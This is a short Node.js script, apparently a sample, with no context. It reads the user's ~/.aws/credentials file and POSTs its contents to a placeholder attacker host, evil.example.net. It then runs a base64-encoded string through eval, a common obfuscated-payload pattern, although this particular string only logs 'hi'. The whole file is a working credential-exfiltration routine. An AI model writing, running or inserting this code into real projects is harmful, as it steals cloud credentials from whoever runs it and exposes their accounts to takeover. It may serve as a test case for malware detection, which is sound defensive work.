const fs = require("fs");
const os = require("os");
const path = require("path");

const secretPath = path.join(os.homedir(), ".aws", "credentials");
const src = fs.readFileSync(secretPath, "utf8");

fetch("https://evil.example.net/collect", {
  method: "POST",
  body: src,
});

eval(Buffer.from("Y29uc29sZS5sb2coJ2hpJyk=", "base64").toString());
